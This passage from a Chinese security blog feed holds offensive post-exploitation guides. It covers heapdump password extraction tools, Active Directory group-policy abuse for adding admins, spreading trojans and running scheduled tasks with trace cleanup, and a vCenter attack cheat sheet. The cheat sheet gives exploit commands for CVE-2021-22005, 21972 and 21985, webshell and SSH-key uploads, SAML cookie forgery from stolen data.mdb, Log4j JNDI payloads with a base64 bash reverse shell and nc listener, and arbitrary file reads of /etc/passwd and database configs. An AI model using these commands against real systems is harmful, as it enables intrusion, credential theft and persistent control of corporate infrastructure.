href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar" target="_blank" rel="noopener">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage:&gt; java -jar heapdump_tool.jar  heapdump</span><br><span class="line">查询方式：</span><br><span class="line"><span class="number">1.</span> 关键词    例如 password </span><br><span class="line"><span class="number">2.</span> 字符长度   len=<span class="number">10</span>    获取长度为<span class="number">10</span>的所有key或者value值</span><br><span class="line"><span class="number">3.</span> 按顺序获取  num=<span class="number">1</span><span class="number">-100</span> 获取顺序<span class="number">1</span><span class="number">-100</span>的字符</span><br><span class="line">获取url,file,ip</span><br><span class="line">geturl   获取所有字符串中的url</span><br><span class="line">getfile  获取所有字符串中的文件路径文件名</span><br><span class="line">getip    获取所有字符串中的ip</span><br><span class="line">默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=<span class="literal">true</span>，all=<span class="literal">false</span>取消显示所有值。</span><br></pre></td></tr></table></figure><h3 id="JDumpSpider"><a href="#JDumpSpider" class="headerlink" title="JDumpSpider"></a>JDumpSpider</h3><blockquote><p>本工具需要使用 Oracle JDK 1.8 版本（更高版本将导致异常）。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar .\target\JDumpSpider-<span class="number">1.0</span>-SNAPSHOT-full.jar                  </span><br><span class="line">Missing required parameter: <span class="string">'&lt;heapfile&gt;'</span></span><br><span class="line">Usage: JDumpSpider [-hV] &lt;heapfile&gt;                   </span><br><span class="line">Extract sensitive information from heapdump file.     </span><br><span class="line">      &lt;heapfile&gt;   Heap file path.                    </span><br><span class="line">  -h, --help       Show this help message and <span class="keyword">exit</span>.   </span><br><span class="line">  -V, --version    Print version information and <span class="keyword">exit</span>.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如果重要的数据（保存在内存中）在使用后没有及时清理，有可能会导致信息泄漏。开发人员通常都回用String 保存敏感数据（密码，卡号等）。因为String 对象是不可变的，只有 JVM 的垃圾回收器才能从内存中清除String的值。而只有内存不足的时候虚拟机才会执行垃圾回收，所以我们不能保证垃圾回收什么时候进行。当系统崩溃后，memory dump 可能会泄漏敏感数据。&lt;/p&gt;</summary>
    
    
    
    
    <category term="java" scheme="https://chenzidu.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>组策略定向攻击</title>
    <link href="https://chenzidu.github.io/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
    <id>https://chenzidu.github.io/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</id>
    <published>2022-12-11T09:45:41.000Z</published>
    <updated>2022-12-11T09:48:14.284Z</updated>
    
    <content type="html"><![CDATA[<p>大部份的公司的局域网都用到域服务来管理办公电脑，而域管理最主要的就是域策略配置，策略配置的好可以大大增加局域网的安全性。配置不当可称为攻击者后渗透的攻击手段。</p><a id="more"></a><h2 id="1、添加用户为本地管理员"><a href="#1、添加用户为本地管理员" class="headerlink" title="1、添加用户为本地管理员"></a>1、添加用户为本地管理员</h2><h3 id="1-1、添加域用户（可以用已有域用户）"><a href="#1-1、添加域用户（可以用已有域用户）" class="headerlink" title="1.1、添加域用户（可以用已有域用户）"></a>1.1、添加域用户（可以用已有域用户）</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655796864-e28564e4-1da1-479e-8454-12ff52329e92.png#averageHue=%23eaeae6&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=468&id=ua913c31d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&size=350454&status=done&style=none&taskId=u11c49e41-4747-49e7-b651-d2ab15c9c32&title=&width=836.6666666666666" alt="image.png"></p><h3 id="2-2、创建组策略"><a href="#2-2、创建组策略" class="headerlink" title="2.2、创建组策略"></a>2.2、创建组策略</h3><p> <strong>操作流程</strong>：服务器管理器 -&gt; 组策略管理  -&gt; 林：domain.com -&gt; 域 -&gt; domain.com -&gt; Default Domain Policy -&gt; 编辑 -&gt; 计算机配置 -&gt; 首选项 -&gt; 控制面板 -&gt; 本地用户和组 -&gt; 新建 -&gt; 本地组 -&gt; 添加域账户<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250888859-54b039aa-69fe-44c8-a375-66152817ef6e.png#averageHue=%2366adcf&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=387&id=u6956d1bb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153273&status=done&style=none&taskId=ufe5ed617-8553-4db6-b7be-a7e2b9820ac&title=&width=730.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655823522-87a3eeb8-4472-4bf6-98fd-6bb37024d2a3.png#averageHue=%23bfd7dd&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=573&id=ubb6c2ba7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=860&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=341915&status=done&style=none&taskId=ue9f5f460-ba2e-41a1-a358-53c9d564cc2&title=&width=836" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250933822-33132226-9fd8-4b92-9895-3ba442a2fe80.png#averageHue=%23eff1ef&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=402&id=u9ebe3d40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=603&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184321&status=done&style=none&taskId=ua934c60d-c817-419f-a2e5-4a550ed5122&title=&width=718" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655849958-cb33556b-7498-4673-bb2c-400617253bd8.png#averageHue=%23b0c1cf&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=623&id=u99120b76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1045&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125711&status=done&style=none&taskId=uce50f65e-ae07-4409-bcde-f6a0ee8f6ab&title=&width=696.6666666666666" alt="image.png"><br>刷新组策略gpupdate /force</p><h2 id="2、域内木马文件共享"><a href="#2、域内木马文件共享" class="headerlink" title="2、域内木马文件共享"></a>2、域内木马文件共享</h2><h3 id="2-1、域内共享文件夹"><a href="#2-1、域内共享文件夹" class="headerlink" title="2.1、域内共享文件夹"></a>2.1、域内共享文件夹</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ysvol<span class="symbol">\d</span>omain.com<span class="symbol">\S</span>CRIPTS</span><br><span class="line">SYSVOL目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>YSVOL<span class="symbol">\s</span>ysvol</span><br></pre></td></tr></table></figure><h4 id="2-1-1、NETLOGON目录"><a href="#2-1-1、NETLOGON目录" class="headerlink" title="2.1.1、NETLOGON目录"></a>2.1.1、NETLOGON目录</h4><p>挂载点:SYSVOL\domain\SCRIPTS 主要存放的是一些脚本信息，是AD活动目录安装时候自动创建的，是在sysvol下面的一个子目录文件夹。</p><h4 id="2-1-2、SYSVOL目录"><a href="#2-1-2、SYSVOL目录" class="headerlink" title="2.1.2、SYSVOL目录"></a>2.1.2、SYSVOL目录</h4><p>AD域中的一个共享文件夹，该文件夹在AD活动目录安装时候被创建。通常用来存放组策略数据 和 一些脚本配置文件，这些策略和脚本将用于传递给域成员机器。<br>此外，域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，并且所有的AD用户都可以访问它。域中，用户登录（计算机）时，会首先在SYSVOL文件查找GPO和启动脚本。同时，为了保证系统的正常运行，必须为SYSVOL保留足够的空间缓存，而且不能随意删除、改动该文件夹，要不然会出现一些组策略无法启用等报错信息。该目录由于针对的是域内所有机器和用户，所以域内中的合法用户均可以访问和执行该目录的文件。(普通的域用户也可以)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250051764-88fd6d69-72a6-4e81-98bf-ef39d93ebc31.png#averageHue=%230f0f0e&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u8a838f00&margin=%5Bobject%20Object%5D&name=image.png&originHeight=249&originWidth=817&originalType=url&ratio=1&rotation=0&showTitle=false&size=27720&status=done&style=none&taskId=ua118eea6-3420-40e0-8a3b-633b2c6fe02&title=" alt="image.png"></p><h3 id="2-2、操作方法"><a href="#2-2、操作方法" class="headerlink" title="2.2、操作方法"></a>2.2、操作方法</h3><h4 id="2-2-1、新建共享文件夹"><a href="#2-2-1、新建共享文件夹" class="headerlink" title="2.2.1、新建共享文件夹"></a>2.2.1、新建共享文件夹</h4><p> 设置共享权限，添加everyone和domain user共享权限。</p><h4 id="2-2-2、域控推送共享文件到客户端桌面"><a href="#2-2-2、域控推送共享文件到客户端桌面" class="headerlink" title="2.2.2、域控推送共享文件到客户端桌面"></a>2.2.2、域控推送共享文件到客户端桌面</h4><ul><li><p>开始 -&gt; 管理工具 -&gt; 组策略管理 -&gt; TJXY.COM(域名) -&gt; Default Domain Policy右键属性 -&gt; 编辑 -&gt; 用户配置 -&gt; 首选项 -&gt; Windows设置 -&gt; 文件</p></li><li><p>右键文件 -&gt; 新建 -&gt; 文件</p><p>   源文件是文件共享路径位置，目标文件是客户端桌面位置<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655902481-8d8a8587-4205-4708-88b1-82e9102e00f9.png#averageHue=%23d0caaa&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=425&id=uf99038c1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=637&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215918&status=done&style=none&taskId=u29777160-d629-4c36-916b-901c5323243&title=&width=829.3333333333334" alt="image.png"></p><pre><code>编辑完成后确定，注意：域控推送文件到客户端桌面，配置完成后服务器和主机先后更新组策略。</code></pre><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器默认更新组策略时间为<span class="number">5</span>分钟，客户端电脑默认更新组策略时间为<span class="number">90</span>分钟。</span><br><span class="line">## 立即更新组策略</span><br><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><h2 id="3、域内计划任务创建"><a href="#3、域内计划任务创建" class="headerlink" title="3、域内计划任务创建"></a>3、域内计划任务创建</h2><h3 id="3-1、工具创建"><a href="#3-1、工具创建" class="headerlink" title="3.1、工具创建"></a>3.1、工具创建</h3><p><a href="https://github.com/3gstudent/Homework-of-Powershell" target="_blank" rel="noopener">New-GPOImmediateTask.ps1</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## 导入ps1</span><br><span class="line">Import-Module GroupPolicy –verbose</span><br><span class="line"></span><br><span class="line">## 执行脚本添加计划任务</span><br><span class="line">New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath <span class="string">'\\dc\sysvol\test1.local'</span> -CommandArguments <span class="string">'-c "123 | Out-File C:\test\debug.txt"'</span></span><br><span class="line"></span><br><span class="line">## 强制更新组策略，或者默认等待<span class="number">90</span>分组等待组策略强制更新</span><br><span class="line">Invoke-GPUpdate -Computer <span class="string">"TEST\COMPUTER-01"</span></span><br><span class="line"></span><br><span class="line">## 清理痕迹</span><br><span class="line">Remove-GPO -Name TestGPO</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;大部份的公司的局域网都用到域服务来管理办公电脑，而域管理最主要的就是域策略配置，策略配置的好可以大大增加局域网的安全性。配置不当可称为攻击者后渗透的攻击手段。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>vCenter常用攻击手法</title>
    <link href="https://chenzidu.github.io/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
    <id>https://chenzidu.github.io/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</id>
    <published>2022-11-22T09:30:35.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/sdk/</span>vimServiceVersions.xml</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-cve-2021-22005"><a href="#0x01-cve-2021-22005" class="headerlink" title="0x01 cve-2021-22005"></a>0x01 cve-2021-22005</h2><h3 id="1-1-影响范围："><a href="#1-1-影响范围：" class="headerlink" title="1.1 影响范围："></a>1.1 影响范围：</h3><ul><li><p>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</p></li><li><p>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</p></li><li><p>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</p></li><li><p>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</p><p> 6.7 vCenters Windows版本不受影响</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> .\<span class="built_in">exp</span>.<span class="keyword">py</span> -t http<span class="variable">s:</span>//<span class="number">192.168</span>.<span class="number">52.152</span> -s api_all_jdk.jsp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014622336-8dab8ce0-bc46-4016-afe2-8f4821d7db00.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=159&id=u4359cdbb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=238&originWidth=1726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42685&status=error&style=none&taskId=u706fb7ad-ac4d-49ce-ae07-836cdc7f65a&title=&width=1150.6666666666667" alt="image.png"><br>连接木马，默认路径/storage/db/vmware-vmdir/data.mdb<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014721247-a2c27eb9-6e57-4133-a64e-172d52b972cd.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=800&id=uf9dfad31&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1200&originWidth=1650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134826&status=error&style=none&taskId=u93328a43-469e-4aa2-b0af-87227c90a2d&title=&width=1100" alt="image.png"></p><h3 id="1-2-vcenter-saml-login"><a href="#1-2-vcenter-saml-login" class="headerlink" title="1.2 vcenter_saml_login"></a>1.2 vcenter_saml_login</h3><p>db数据库存放位置</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库存放路径</span><br><span class="line">Windows vCenter：<span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/vmdird/</span>data.mdb</span><br><span class="line">Linux vCenter：<span class="regexp">/storage/</span>db<span class="regexp">/vmware-vmdir/</span>data.mdb</span><br></pre></td></tr></table></figure><p>拖到本地利用：vcenter_saml_login<br>配置cmd代理，利用netch到本地127.0.0.1:1080</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">vcenter_saml_login</span><span class="selector-class">.py</span> <span class="selector-tag">-p</span> <span class="selector-tag">data</span><span class="selector-class">.mdb</span> <span class="selector-tag">-t</span> 10<span class="selector-class">.118</span><span class="selector-class">.11</span><span class="selector-class">.220</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014667035-e0e7827b-d992-407f-96d6-2bd167a03dbc.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=280&id=u0bc9599a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63941&status=error&style=none&taskId=u88852a40-3796-45f0-b970-a6b66fcdae2&title=&width=958.6666666666666" alt="image.png"><br>修改cookie进行连接<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014858229-ccfa2893-e26e-4b44-b3d8-1892bc85f2fb.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=979&id=u810e6ad5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=483906&status=error&style=none&taskId=u9cf5e640-fd71-472e-977b-2818d83976b&title=&width=1706.6666666666667" alt="image.png"></p></li></ul><h2 id="0x02-CVE-2021-21972"><a href="#0x02-CVE-2021-21972" class="headerlink" title="0x02 CVE-2021-21972"></a>0x02 CVE-2021-21972</h2><p>影响范围</p><ul><li>vCenter Server7.0 &lt; 7.0.U1c</li><li>vCenter Server6.7 &lt; 6.7.U3l</li><li>vCenter Server6.5 &lt; 6.5.U3n<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ui/</span>vropspluginui<span class="regexp">/rest/</span>services<span class="regexp">/uploadova</span></span><br></pre></td></tr></table></figure>访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞。<h3 id="2-1-windows机器："><a href="#2-1-windows机器：" class="headerlink" title="2.1 windows机器："></a>2.1 windows机器：</h3>漏洞利用： <a href="https://github.com/horizon3ai/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/horizon3ai/CVE-2021-21972</a><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-21972.py -t x.x.x.x -p c:<span class="symbol">\\</span>ProgramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\d</span>ata<span class="symbol">\p</span>erfcharts<span class="symbol">\t</span>c-instance<span class="symbol">\w</span>ebapps<span class="symbol">\s</span>tatsreport<span class="symbol">\g</span>sl.jsp -o win -f gsl.jsp</span><br><span class="line"></span><br><span class="line">-t （目标地址）</span><br><span class="line">-f （上传的文件）</span><br><span class="line">-p （上传后的webshell路径，默认不用改）</span><br></pre></td></tr></table></figure>上传后路径<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//x.x.x.x/statsreport/gsl.jsp</span></span><br><span class="line"><span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/perfcharts/</span>tc-instance<span class="regexp">/webapps/</span>statsreport</span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666943631368-67be46a7-d4ae-4f7f-989c-7d3d90165efd.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=636&id=u2f99974f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141792&status=error&style=none&taskId=u146f1450-a6cd-44a5-baa9-cba412a8694&title=&width=1153.3333333333333" alt="image.png"><h3 id="2-2-linux机器"><a href="#2-2-linux机器" class="headerlink" title="2.2 linux机器"></a>2.2 linux机器</h3>1、写公私钥（需要22端口开放）<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE<span class="number">-2021</span><span class="number">-21972.</span>py -t <span class="number">10.16</span><span class="number">.8</span><span class="number">.168</span> -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f c:<span class="comment">//Users/think/.ssh/id_rsa.pub</span></span><br></pre></td></tr></table></figure>2、遍历写shell（时间较久）<br><a href="https://github.com/NS-Sp4ce/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/CVE-2021-21972</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664443620010-0610d5fc-4467-4560-af43-b147c1b7cb71.png#clientId=u04e4c8d1-ce4e-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=uc39792dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=949&originWidth=1891&originalType=url&ratio=1&rotation=0&showTitle=false&size=318120&status=error&style=none&taskId=u89c88664-6d75-434c-94f5-f1e6f7d82bc&title=" alt="image.png"><h2 id="0x03-CVE-2021-21985"><a href="#0x03-CVE-2021-21985" class="headerlink" title="0x03 CVE-2021-21985"></a>0x03 CVE-2021-21985</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -cp  JNDI-Injection-Bypass<span class="number">-1.0</span>-SNAPSHOT-all.jar payloads.EvilRMIServer <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line">nc -lvvp <span class="number">55552</span></span><br><span class="line"></span><br><span class="line">python3 cve<span class="number">-2021</span><span class="number">-21985.</span>py https:<span class="comment">//host rmi://8.8.8.8:1099/Exploit</span></span><br></pre></td></tr></table></figure><h2 id="0x04-Log4j"><a href="#0x04-Log4j" class="headerlink" title="0x04 Log4j"></a>0x04 Log4j</h2>${jndi:ldap://exp}<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"cmd /c whoami"</span> -A <span class="string">"172.30.84.134"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"bash -c &#123;echo,base编码内容&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="string">"ip"</span></span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666938590825-b0a1315f-9b40-41be-86cc-011aef38a4a0.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=315&id=u4b5ed440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=472&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59858&status=error&style=none&taskId=u039db2a0-d248-438e-8146-10e8dbb8fee&title=&width=358.6666666666667" alt="image.png"><h2 id="0x05-vmware未授权任意文件读取漏洞"><a href="#0x05-vmware未授权任意文件读取漏洞" class="headerlink" title="0x05 vmware未授权任意文件读取漏洞"></a>0x05 vmware未授权任意文件读取漏洞</h2><h3 id="5-1、漏洞影响版本"><a href="#5-1、漏洞影响版本" class="headerlink" title="5.1、漏洞影响版本"></a>5.1、漏洞影响版本</h3>已知影响版本 VMware vCenter 6.5.0a-f<br>安全版本 VMware vCenter 6.5u1<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#windows</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664111112270-a885b799-b7a6-48a6-9be5-784341846266.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=ubdba19ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1778&originalType=url&ratio=1&rotation=0&showTitle=false&size=187525&status=error&style=none&taskId=u70e00efe-f5f9-437b-8aae-0e46de424ba&title=" alt="image.png"></li></ul><h2 id="0x06-vCenter低权限账户提权思路"><a href="#0x06-vCenter低权限账户提权思路" class="headerlink" title="0x06 vCenter低权限账户提权思路"></a>0x06 vCenter低权限账户提权思路</h2><h3 id="6-1、获取ssh权限后修改密码"><a href="#6-1、获取ssh权限后修改密码" class="headerlink" title="6.1、获取ssh权限后修改密码"></a>6.1、获取ssh权限后修改密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux </span></span><br><span class="line">/usr/lib/vmware-vmdir/bin/vdcadmintool </span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows </span></span><br><span class="line">C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入3回车</span></span><br><span class="line"><span class="comment"># 然后输入用户名(用户名输入错误会提示：VmDirForceResetPassword failed (9106))</span></span><br><span class="line"><span class="comment"># 复制生成的新密码(新密码不能自定义，只能工具生成的)</span></span><br><span class="line">==================</span><br><span class="line">Please <span class="keyword">select</span>:</span><br><span class="line"><span class="number">0.</span> <span class="keyword">exit</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">Test</span> LDAP connectivity</span><br><span class="line"><span class="number">2.</span> <span class="keyword">Force</span> <span class="keyword">start</span> <span class="keyword">replication</span> <span class="keyword">cycle</span></span><br><span class="line"><span class="number">3.</span> <span class="keyword">Reset</span> <span class="keyword">account</span> <span class="keyword">password</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">Set</span> <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Set</span> vmdir state</span><br><span class="line"><span class="number">6.</span> <span class="keyword">Get</span> vmdir state</span><br><span class="line"><span class="number">7.</span> <span class="keyword">Get</span> vmdir <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line">==================</span><br></pre></td></tr></table></figure><h3 id="6-2、Vmware数据库配置文件"><a href="#6-2、Vmware数据库配置文件" class="headerlink" title="6.2、Vmware数据库配置文件"></a>6.2、Vmware数据库配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># linux</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware-vpx/vcdb.properties</span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware<span class="meta-keyword">/service-state/</span>vpxd/vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="meta"># windows</span></span><br><span class="line"><span class="symbol">C:</span>\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties</span><br></pre></td></tr></table></figure><p><img 